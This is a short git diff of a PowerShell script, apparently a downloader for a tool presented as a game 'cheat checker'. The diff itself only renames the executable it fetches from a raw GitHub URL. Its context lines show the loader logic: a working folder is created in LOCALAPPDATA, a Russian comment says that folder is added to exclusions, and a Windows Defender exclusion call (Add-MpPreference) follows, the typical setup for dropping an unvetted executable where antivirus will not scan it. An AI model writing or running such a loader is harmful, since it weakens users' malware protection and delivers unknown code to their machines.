@@ -36,7 +36,7 @@ $repoOwner  = "die4mebaby"
 $repoName   = "CheatChecker"
 $branch     = "main"
 $rawBaseUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/$branch"
-$exeUrl     = "$rawBaseUrl/cheatchecker.exe"
+$exeUrl     = "$rawBaseUrl/nocheat.checker.exe"
 
 # директ добавляем в исключения
 $workDir = Join-Path $env:LOCALAPPDATA "NoCheatChecker"
@@ -45,7 +45,7 @@ if (-not (Test-Path $workDir)) {
     New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 }
 
-$exePath = Join-Path $workDir "cheatchecker.exe"
+$exePath = Join-Path $workDir "nocheat.checker.exe"
 
 try {
     if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
